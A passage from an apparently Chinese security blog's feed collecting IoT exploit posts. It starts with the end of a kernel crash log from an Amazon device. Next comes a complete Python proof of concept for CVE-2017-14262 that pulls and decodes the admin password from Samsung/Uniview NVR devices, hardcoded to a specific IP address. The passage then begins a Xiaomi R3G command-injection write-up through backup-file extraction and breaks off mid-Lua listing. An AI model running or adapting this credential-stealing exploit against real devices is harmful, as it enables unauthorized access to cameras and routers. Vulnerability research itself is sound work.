class="line">[18460.815643] dec8  dcccf608 cfa9bf00 de94defc de94dee0 c02089fc 00000000 00000000 00000000</span><br><span class="line">[18460.826202] dee8  00000000 d683fb40 00000004 d683fb40 de94df74 de94df08 c0136044 c031af2c</span><br><span class="line">[18460.836730] df08  00000000 00000000 00000000 00000001 00000000 dd188490 d8f925d8 de94df0c</span><br><span class="line">[18460.847381] df28  de94c000 bea87618 bea875ec 00006100 d683fb40 00000004 de94c000 00000000</span><br><span class="line">[18460.858032] df48  de94df64 00000000 bea875ec 00006100 d683fb40 00000004 de94c000 00000000</span><br><span class="line">[18460.868713] </span><br><span class="line">[18460.868713] R3: 0xfffffe34:</span><br><span class="line">[18460.873687] fe34  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.884246] fe54  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.894805] fe74  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.905456] fe94  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.916137] feb4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.926788] fed4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.937347] fef4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.948028] ff14  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.958709] </span><br><span class="line">[18460.958709] R7: 0xde94bf80:</span><br><span class="line">[18460.963684] bf80  de926680 c00635cc 00000013 de84190c de926680 c00635cc 00000013 00000000</span><br><span class="line">[18460.974365] bfa0  00000000 00000000 de94bff4 de94bfb8 c0068af4 c00635d8 00000000 00000000</span><br><span class="line">[18460.985015] bfc0  de926680 00000000 00000000 00000000 de94bfd0 de94bfd0 00000000 de84190c</span><br><span class="line">[18460.995574] bfe0  c0068a64 c004cd64 00000000 de94bff8 c004cd64 c0068a70 1d04e2fb 1dfbe204</span><br><span class="line">[18461.006225] c000  00000000 00000002 00000000 c2572140 c0a0e840 00000000 00000015 cf9fca80</span><br><span class="line">[18461.016906] c020  00000000 de94c000 c09ddc50 c2572140 c25717c0 c1617b40 de94da7c de94d9c8</span><br><span class="line">[18461.027587] c040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000</span><br><span class="line">[18461.038146] c060  00c5f4c0 5ebcc27f 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[18461.048828] </span><br><span class="line">[18461.048828] R9: 0xdcccf588:</span><br><span class="line">[18461.053802] f588  dcccf588 dcccf588 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[18461.064483] f5a8  00000000 00000000 dcccf5b0 dcccf5b0 00000000 dcccf5bc dcccf5bc 00000000</span><br><span class="line">[18461.075134] f5c8  5ae3ed25 00000000 00000000 00000000 dcccf5e0 00000000 00000000 00000000</span><br><span class="line">[18461.085815] f5e8  00200000 00000000 00000000 dcccf5f4 dcccf5f4 dccb2440 dccb2440 00000000</span><br><span class="line">[18461.096343] f608  00052180 00000000 00000000 00000000 00000000 00000000 c06b9600 dd1a4800</span><br><span class="line">[18461.107025] f628  dcccf6e0 dccb0300 00000c45 00000001 00a0003b 5ae3ed25 2bc5ac58 5ae3ed25</span><br><span class="line">[18461.117675] f648  2bc5ac58 5ae3ed25 2bc5ac58 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[18461.128234] f668  00000000 00000000 00000000 00000000 00000001 00000000 00000000 dcccf684</span><br><span class="line">[18461.138885] Process twl6030_gpadc_i (pid: 12849, stack limit &#x3D; 0xde94c2f8)</span><br><span class="line">[18461.146697] Stack: (0xde94dd90 to 0xde94e000)</span><br><span class="line">[18461.151611] dd80:                                     de94ddac 9b2a9212 00000000 00000000</span><br><span class="line">[18461.160827] dda0: 00040000 0001f8fc 00000000 00000000 c00795a0 00000001 de94ddd4 de94ddc8</span><br><span class="line">[18461.170043] ddc0: c00795b4 c00792bc de94de0c de94ddd8 c0070df8 c00795ac de94c000 00000001</span><br><span class="line">[18461.179138] dde0: 00000004 dd32f8f4 60000013 00000001 00000001 00000004 dd32f800 00000000</span><br><span class="line">[18461.188354] de00: 00000000 de94de10 c00723a0 c06a4818 00000004 00000001 dd32e0d8 dd32f800</span><br><span class="line">[18461.197570] de20: dd32e000 0000000a de94c000 c26fda80 de94de54 de94de40 c02ba53c c0072360</span><br><span class="line">[18461.206787] de40: dd32f800 dd32e000 de94de74 de94de58 c02c3c88 c02ba518 dd32e000 00000002</span><br><span class="line">[18461.215881] de60: 00000002 dd32fbbc c2572140 de94debc 00000001 00000028 000fffff 00000001</span><br><span class="line">[18461.225097] de80: de94dedc de94de90 c0207454 c00bd920 0000001e c26fda80 de94ded4 de94dea8</span><br><span class="line">[18461.234313] dea0: c00723a0 000fffff 00000000 ffffffff 00000002 00000001 00000000 de94df14</span><br><span class="line">[18461.243408] dec0: 00000000 00000001 dcccf608 cfa9bf00 de94defc de94dee0 c02089fc 00000000</span><br><span class="line">[18461.252624] dee0: 00000000 00000000 00000000 d683fb40 00000004 d683fb40 de94df74 de94df08</span><br><span class="line">[18461.261840] df00: c0136044 c031af2c 00000000 00000000 00000000 00000001 00000000 dd188490</span><br><span class="line">[18461.271057] df20: d8f925d8 de94df0c de94c000 bea87618 bea875ec 00006100 d683fb40 00000004</span><br><span class="line">[18461.280151] df40: de94c000 00000000 de94df64 00000000 bea875ec 00006100 d683fb40 00000004</span><br><span class="line">[18461.289367] df60: de94c000 00000000 de94dfa4 de94df78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[18461.298583] df80: 00000400 bea87618 00010e5c 00000000 00000036 c0013e08 00000000 de94dfa8</span><br><span class="line">[18461.307800] dfa0: c0013c60 c0136578 bea87618 00010e5c 00000004 00006100 bea875ec bea875ec</span><br><span class="line">[18461.316894] dfc0: bea87618 00010e5c 00000000 00000036 00000000 00000000 00000000 bea87604</span><br><span class="line">[18461.326110] dfe0: 00000000 bea875d4 00010698 0002918c 60000010 00000004 00000000 00000000</span><br><span class="line">[18461.335296] Backtrace: </span><br><span class="line">[18461.338317] [&lt;c031af20&gt;] (twl6030_gpadc_ioctl+0x0&#x2F;0x180) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[18461.348571]  r7:d683fb40 r6:00000004 r5:d683fb40 r4:00000000</span><br><span class="line">[18461.355560] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[18461.364807] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[18461.374206]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e5c r4:bea87618</span><br><span class="line">[18461.382507] Code: e24b101c e30f3eb4 e34f3fff e0812102 (e5122134) </span><br><span class="line">[18461.401061] Board Information: </span><br><span class="line">[18461.401061]  Revision : 0001</span><br><span class="line">[18461.401092]  Serial	: 0000000000000000</span><br><span class="line">[18461.401092] SoC Information:</span><br><span class="line">[18461.401092]  CPU	: OMAP4470</span><br><span class="line">[18461.401122]  Rev	: ES1.0</span><br><span class="line">[18461.401122]  Type	: HS</span><br><span class="line">[18461.401122]  Production ID: 0002B975-000000CC</span><br><span class="line">[18461.401122]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[18461.401153] </span><br><span class="line">[18461.406127] audit_printk_skb: 111 callbacks suppressed</span><br><span class="line">[18461.406127] type&#x3D;1400 audit(1525657115.783:1097): avc:  denied  &#123; getattr &#125; for  pid&#x3D;12851 comm&#x3D;&quot;am&quot; path&#x3D;&quot;&#x2F;system&#x2F;bin&#x2F;app_process&quot; dev&#x3D;&quot;mmcblk0p9&quot; ino&#x3D;32006 scontext&#x3D;u:r:untrusted_app:s0 tcontext&#x3D;u:object_r:zygote_exec:s0 tclass&#x3D;file</span><br><span class="line">[18461.406280] type&#x3D;1400 audit(1525657115.783:1098): avc:  denied  &#123; execute &#125; for  pid&#x3D;12851 comm&#x3D;&quot;am&quot; name&#x3D;&quot;app_process&quot; dev&#x3D;&quot;mmcblk0p9&quot; ino&#x3D;32006 scontext&#x3D;u:r:untrusted_app:s0 tcontext&#x3D;u:object_r:zygote_exec:s0 tclass&#x3D;file</span><br><span class="line">[18461.406524] type&#x3D;1400 audit(1525657115.783:1099): avc:  denied  &#123; read open &#125; for  pid&#x3D;12851 comm&#x3D;&quot;am&quot; name&#x3D;&quot;app_process&quot; dev&#x3D;&quot;mmcblk0p9&quot; ino&#x3D;32006 scontext&#x3D;u:r:untrusted_app:s0 tcontext&#x3D;u:object_r:zygote_exec:s0 tclass&#x3D;file</span><br><span class="line">[18461.406768] type&#x3D;1400 audit(1525657115.783:1100): avc:  denied  &#123; execute_no_trans &#125; for  pid&#x3D;12851 comm&#x3D;&quot;am&quot; path&#x3D;&quot;&#x2F;system&#x2F;bin&#x2F;app_process&quot; dev&#x3D;&quot;mmcblk0p9&quot; ino&#x3D;32006 scontext&#x3D;u:r:untrusted_app:s0 tcontext&#x3D;u:object_r:zygote_exec:s0 tclass&#x3D;file</span><br><span class="line">[18461.534057] ---[ end trace f98f4a7b98572f61 ]---</span><br><span class="line">[18461.540374] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[18461.546173] CPU1: stopping</span><br><span class="line">[18461.549285] Backtrace: </span><br><span class="line">[18461.552459] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[18461.561828]  r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950</span><br><span class="line">[18461.568969] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[18461.578185] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[18461.587554] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5540&gt;] (__irq_usr+0x40&#x2F;0x60)</span><br><span class="line">[18461.596862] Exception stack(0xc8967fb0 to 0xc8967ff8)</span><br><span class="line">[18461.602691] 7fa0:                                     404143ed 4041294b 00000054 000012f0</span><br><span class="line">[18461.611755] 7fc0: 4028cdb4 4040e438 0000012f 4041294b 4040d148 404111d8 beb9c2e0 404275c0</span><br><span class="line">[18461.620971] 7fe0: 40416bef beb9c1f0 4009d01f 400a0ec0 000f0010 ffffffff</span><br><span class="line">[18461.628478]  r6:ffffffff r5:000f0010 r4:400a0ec0 r3:404143ed</span><br><span class="line">[18461.635559] CPU0 PC (0) : 0xc003ee38</span><br><span class="line">[18461.639617] CPU0 PC (1) : 0xc003ee54</span><br><span class="line">[18461.643798] CPU0 PC (2) : 0xc003ee54</span><br><span class="line">[18461.647857] CPU0 PC (3) : 0xc003ee54</span><br><span class="line">[18461.651916] CPU0 PC (4) : 0xc003ee54</span><br><span class="line">[18461.656097] CPU0 PC (5) : 0xc003ee54</span><br><span class="line">[18461.660156] CPU0 PC (6) : 0xc003ee54</span><br><span class="line">[18461.664215] CPU0 PC (7) : 0xc003ee54</span><br><span class="line">[18461.668395] CPU0 PC (8) : 0xc003ee54</span><br><span class="line">[18461.672454] CPU0 PC (9) : 0xc003ee54</span><br><span class="line">[18461.676513] CPU1 PC (0) : 0xc0019b2c</span><br><span class="line">[18461.680694] CPU1 PC (1) : 0xc0019b2c</span><br><span class="line">[18461.684753] CPU1 PC (2) : 0xc0019b2c</span><br><span class="line">[18461.688812] CPU1 PC (3) : 0xc0019b2c</span><br><span class="line">[18461.692871] CPU1 PC (4) : 0xc0019b2c</span><br><span class="line">[18461.697051] CPU1 PC (5) : 0xc0019b2c</span><br><span class="line">[18461.701110] CPU1 PC (6) : 0xc0019b2c</span><br><span class="line">[18461.705169] CPU1 PC (7) : 0xc0019b2c</span><br><span class="line">[18461.709381] CPU1 PC (8) : 0xc0019b2c</span><br><span class="line">[18461.713409] CPU1 PC (9) : 0xc0019b2c</span><br><span class="line">[18461.717498] </span><br><span class="line">[18461.719268] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[18461.719299] </span><br></pre></td></tr></table></figure>
</blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Amazon</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2017-14262）Samsung NVR devices 漏洞</title>
    <url>/2020/08/06/IOT/Exploit/%E4%B8%89%E6%98%9F/%EF%BC%88CVE-2017-14262%EF%BC%89Samsung%20NVR%20devices%20%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Samsung NVR devices是韩国三星（Samsung）公司的一款网络视频录像机设备。 Samsung NVR设备中存在安全漏洞。远程攻击者可利用该漏洞读取管理员账户的MD5密码散列，并登录设备。</p>
<a id="more"></a>

<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> takewhile</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SamsungNVR</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    此漏洞三星和 uniview 都有</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    vul_info = &#123;</span><br><span class="line">        <span class="string">&quot;title&quot;</span>: <span class="string">&quot;Samsung NVR设备安全漏洞&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cve&quot;</span>: <span class="string">&quot;CVE-2017-14262&quot;</span>,</span><br><span class="line">        <span class="string">&quot;desc&quot;</span>: <span class="string">&quot;Samsung NVR devices是韩国三星（Samsung）公司的一款网络视频录像机设备。&quot;</span></span><br><span class="line">                <span class="string">&quot;Samsung NVR设备中存在安全漏洞。远程攻击者可利用该漏洞读取管理员账户的MD5密码散列，并登录设备。&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pass_index = OrderedDict(</span><br><span class="line">        [(<span class="number">1</span>, <span class="number">1</span>), (<span class="number">9192090</span>, <span class="number">2</span>), (<span class="number">1020910</span>, <span class="number">3</span>), (<span class="number">25549780</span>, <span class="number">4</span>), (<span class="number">24507899</span>, <span class="number">5</span>), (<span class="number">16119889</span>, <span class="number">6</span>), (<span class="number">9428219</span>, <span class="number">7</span>), (<span class="number">2281891</span>, <span class="number">8</span>),</span><br><span class="line">         (<span class="number">10861120</span>, <span class="number">9</span>), (<span class="number">15331742</span>, <span class="number">10</span>), (<span class="number">22464897</span>, <span class="number">11</span>), (<span class="number">24403461</span>, <span class="number">12</span>), (<span class="number">13833575</span>, <span class="number">13</span>), (<span class="number">16061285</span>, <span class="number">14</span>), (<span class="number">10721046</span>, <span class="number">15</span>),</span><br><span class="line">         (<span class="number">16593252</span>, <span class="number">16</span>), (<span class="number">22051260</span>, <span class="number">17</span>), (<span class="number">16638739</span>, <span class="number">18</span>), (<span class="number">6666540</span>, <span class="number">19</span>), (<span class="number">9283102</span>, <span class="number">20</span>), (<span class="number">18791719</span>, <span class="number">21</span>), (<span class="number">25905184</span>, <span class="number">22</span>),</span><br><span class="line">         (<span class="number">2762182</span>, <span class="number">23</span>), (<span class="number">12911758</span>, <span class="number">24</span>), (<span class="number">21944959</span>, <span class="number">25</span>), (<span class="number">10257708</span>, <span class="number">26</span>), (<span class="number">894574</span>, <span class="number">27</span>), (<span class="number">16004987</span>, <span class="number">28</span>), (<span class="number">12850146</span>, <span class="number">29</span>),</span><br><span class="line">         (<span class="number">8043423</span>, <span class="number">30</span>), (<span class="number">7835618</span>, <span class="number">31</span>), (<span class="number">18372773</span>, <span class="number">32</span>), (<span class="number">9417841</span>, <span class="number">33</span>), (<span class="number">18658565</span>, <span class="number">34</span>), (<span class="number">10330028</span>, <span class="number">35</span>), (<span class="number">13289156</span>, <span class="number">36</span>),</span><br><span class="line">         (<span class="number">23739388</span>, <span class="number">37</span>), (<span class="number">12401865</span>, <span class="number">38</span>), (<span class="number">15005445</span>, <span class="number">39</span>), (<span class="number">10176399</span>, <span class="number">40</span>), (<span class="number">10776092</span>, <span class="number">41</span>), (<span class="number">16860945</span>, <span class="number">42</span>), (<span class="number">5353890</span>, <span class="number">43</span>),</span><br><span class="line">         (<span class="number">2688051</span>, <span class="number">44</span>), (<span class="number">39030</span>, <span class="number">45</span>), (<span class="number">18708319</span>, <span class="number">46</span>), (<span class="number">23920727</span>, <span class="number">47</span>), (<span class="number">4762271</span>, <span class="number">48</span>), (<span class="number">24294435</span>, <span class="number">49</span>), (<span class="number">16720763</span>, <span class="number">50</span>),</span><br><span class="line">         (<span class="number">21207445</span>, <span class="number">51</span>), (<span class="number">20598600</span>, <span class="number">52</span>), (<span class="number">13303854</span>, <span class="number">53</span>), (<span class="number">2666164</span>, <span class="number">54</span>), (<span class="number">19813766</span>, <span class="number">55</span>), (<span class="number">16041010</span>, <span class="number">56</span>), (<span class="number">3127839</span>, <span class="number">57</span>),</span><br><span class="line">         (<span class="number">25260962</span>, <span class="number">58</span>), (<span class="number">15859882</span>, <span class="number">59</span>), (<span class="number">23452596</span>, <span class="number">60</span>), (<span class="number">11396657</span>, <span class="number">61</span>), (<span class="number">18994119</span>, <span class="number">62</span>), (<span class="number">12423246</span>, <span class="number">63</span>), (<span class="number">21498126</span>, <span class="number">64</span>),</span><br><span class="line">         (<span class="number">23593931</span>, <span class="number">65</span>), (<span class="number">9818447</span>, <span class="number">66</span>), (<span class="number">14937061</span>, <span class="number">67</span>), (<span class="number">24683641</span>, <span class="number">68</span>), (<span class="number">11058089</span>, <span class="number">69</span>), (<span class="number">12800298</span>, <span class="number">70</span>), (<span class="number">133183</span>, <span class="number">71</span>),</span><br><span class="line">         (<span class="number">26013724</span>, <span class="number">72</span>), (<span class="number">19021449</span>, <span class="number">73</span>), (<span class="number">25487361</span>, <span class="number">74</span>), (<span class="number">3426696</span>, <span class="number">75</span>), (<span class="number">22326185</span>, <span class="number">76</span>), (<span class="number">9151922</span>, <span class="number">77</span>), (<span class="number">20416123</span>, <span class="number">78</span>),</span><br><span class="line">         (<span class="number">13876302</span>, <span class="number">79</span>), (<span class="number">497003</span>, <span class="number">80</span>), (<span class="number">18662430</span>, <span class="number">81</span>), (<span class="number">7306818</span>, <span class="number">82</span>), (<span class="number">24323487</span>, <span class="number">83</span>), (<span class="number">26110937</span>, <span class="number">84</span>),</span><br><span class="line">         (<span class="number">5380058</span>, <span class="number">85</span>), (<span class="number">21481095</span>, <span class="number">86</span>), (<span class="number">9540458</span>, <span class="number">87</span>), (<span class="number">14123621</span>, <span class="number">88</span>), (<span class="number">6847253</span>, <span class="number">89</span>), (<span class="number">7638896</span>, <span class="number">90</span>),</span><br><span class="line">         (<span class="number">22385568</span>, <span class="number">91</span>), (<span class="number">1208753</span>, <span class="number">92</span>), (<span class="number">15383366</span>, <span class="number">93</span>), (<span class="number">24719837</span>, <span class="number">94</span>), (<span class="number">26729699</span>, <span class="number">95</span>), (<span class="number">3594142</span>, <span class="number">96</span>),</span><br><span class="line">         (<span class="number">371291</span>, <span class="number">97</span>), (<span class="number">23345327</span>, <span class="number">98</span>), (<span class="number">4415431</span>, <span class="number">99</span>), (<span class="number">6477625</span>, <span class="number">100</span>), (<span class="number">4733341</span>, <span class="number">101</span>), (<span class="number">13423221</span>, <span class="number">102</span>),</span><br><span class="line">         (<span class="number">24215867</span>, <span class="number">103</span>), (<span class="number">7503741</span>, <span class="number">104</span>), (<span class="number">6390751</span>, <span class="number">105</span>), (<span class="number">10192199</span>, <span class="number">106</span>), (<span class="number">10352855</span>, <span class="number">107</span>), (<span class="number">22393893</span>, <span class="number">108</span>),</span><br><span class="line">         (<span class="number">7198498</span>, <span class="number">109</span>), (<span class="number">12838108</span>, <span class="number">110</span>), (<span class="number">5515125</span>, <span class="number">111</span>), (<span class="number">7229843</span>, <span class="number">112</span>), (<span class="number">13872090</span>, <span class="number">113</span>), (<span class="number">21671745</span>, <span class="number">114</span>),</span><br><span class="line">         (<span class="number">12457317</span>, <span class="number">115</span>), (<span class="number">26153875</span>, <span class="number">116</span>), (<span class="number">14327497</span>, <span class="number">117</span>), (<span class="number">11382568</span>, <span class="number">118</span>), (<span class="number">10132668</span>, <span class="number">119</span>), (<span class="number">20086929</span>, <span class="number">120</span>),</span><br><span class="line">         (<span class="number">8117696</span>, <span class="number">121</span>), (<span class="number">2098389</span>, <span class="number">122</span>), (<span class="number">21553350</span>, <span class="number">123</span>), (<span class="number">23391670</span>, <span class="number">124</span>), (<span class="number">25350683</span>, <span class="number">125</span>), (<span class="number">25970062</span>, <span class="number">126</span>),</span><br><span class="line">         (<span class="number">6959731</span>, <span class="number">127</span>), (<span class="number">16338714</span>, <span class="number">128</span>)])</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt_password</span>(<span class="params">cls, json_resp</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;解密管理员账户密码&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            au_pwd = takewhile(<span class="keyword">lambda</span> x: x != <span class="number">0</span>, json_resp[<span class="string">&quot;au32LoginPasswd&quot;</span>])</span><br><span class="line">            password = <span class="string">&quot;&quot;</span>.join(chr(cls.pass_index[pwd_int]) <span class="keyword">for</span> pwd_int <span class="keyword">in</span> au_pwd)</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ip: str, port: int</span>):</span></span><br><span class="line">        self._base_url = <span class="string">f&quot;http://<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        vul_path = <span class="string">&#x27;/cgi-bin/main-cgi?json=&#123;&quot;cmd&quot;:201,&quot;szUserName_Qry&quot;:&quot;admin&quot;,&quot;szUserName&quot;:&quot;&quot;,&quot;u32UserLoginHandle&quot;:0&#125;&#x27;</span></span><br><span class="line">        url = self._base_url + vul_path</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = requests.get(url, timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> req.status_code == <span class="number">200</span>:</span><br><span class="line">                res_json = req.json()</span><br><span class="line">                hash_pass = res_json.get(<span class="string">&quot;szLoginPasswd&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> hash_pass:</span><br><span class="line">                    plain_pass = self.decrypt_password(res_json)</span><br><span class="line">                    <span class="keyword">if</span> plain_pass:</span><br><span class="line">                        <span class="keyword">return</span> &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>: plain_pass&#125;</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    vul = SamsungNVR(<span class="string">&quot;117.158.178.49&quot;</span>, <span class="number">84</span>)</span><br><span class="line">    vulres = vul.verify()</span><br><span class="line">    print(<span class="string">f&quot;[-] <span class="subst">&#123;vul.vul_info&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> vulres:</span><br><span class="line">        print(<span class="string">f&quot;[+] 存在漏洞:<span class="subst">&#123;vulres&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[-] 不存在漏洞。&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>三星</tag>
      </tags>
  </entry>
  <entry>
    <title>(CVE-2019-18370)Xiaomi Mi WiFi R3G 远程命令执行漏洞</title>
    <url>/2020/09/12/IOT/Exploit/%E5%B0%8F%E7%B1%B3/CVE-2019-18370-Xiaomi-Mi-WiFi-R3G-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Xiaomi Mi WiFi R3G是中国小米科技（Xiaomi）公司的一款3G路由器。 Xiaomi Mi WiFi R3G 2.28.23-stable之前版本中存在输入验证错误漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Xiaomi Mi WiFi R3G 2.28.23-stable之前版本</p>
<a id="more"></a>

<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>备份文件是<code>tar.gz</code>格式的，上传后<code>tar zxf</code>解压，所以构造备份文件，可以控制解压目录的文件内容，结合测试上传下载速度功能的sh脚本执行时读取测试url列表文件，并将url部分直接进行命令拼接执行。</p>
<p>备份文件解压导致<code>/tmp/</code>目录任意文件可控</p>
<p>在<code>/usr/lib/lua/luci/controller/api/misystem.lua</code>中，配置文件功能如下</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cUpload</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> LuciFs = <span class="built_in">require</span>(<span class="string">&quot;luci.fs&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> XQBackup = <span class="built_in">require</span>(<span class="string">&quot;xiaoqiang.module.XQBackup&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> code = <span class="number">0</span></span><br><span class="line">    <span class="keyword">local</span> canupload = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">local</span> uploadFilepath = <span class="string">&quot;/tmp/cfgbackup.tar.gz&quot;</span></span><br><span class="line">    <span class="keyword">local</span> fileSize = <span class="built_in">tonumber</span>(LuciHttp.<span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_LENGTH&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> fileSize &gt; <span class="number">102400</span> <span class="keyword">then</span></span><br><span class="line">        canupload = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    LuciHttp.setfilehandler(</span><br><span class="line">        <span class="function"><span class="keyword">function</span><span class="params">(meta, chunk, eof)</span></span></span><br><span class="line">            <span class="keyword">if</span> canupload <span class="keyword">then</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> fp <span class="keyword">then</span></span><br><span class="line">                    <span class="keyword">if</span> meta <span class="keyword">and</span> meta.name == <span class="string">&quot;image&quot;</span> <span class="keyword">then</span></span><br><span class="line">                        fp = <span class="built_in">io</span>.<span class="built_in">open</span>(uploadFilepath, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">                    <span class="keyword">end</span></span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">                <span class="keyword">if</span> chunk <span class="keyword">then</span></span><br><span class="line">                    fp:<span class="built_in">write</span>(chunk)</span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">                <span class="keyword">if</span> eof <span class="keyword">then</span></span><br><span class="line">                    fp:<span class="built_in">close</span>()</span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                code = <span class="number">1630</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> LuciHttp.formvalue(<span class="string">&quot;image&quot;</span>) <span class="keyword">and</span> fp <span class="keyword">then</span></span><br><span class="line">        code = <span class="number">0</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> result = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> code == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">local</span> ext = XQBackup.extract(uploadFilepath)</span><br><span class="line">        <span class="keyword">if</span> ext == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">            result[<span 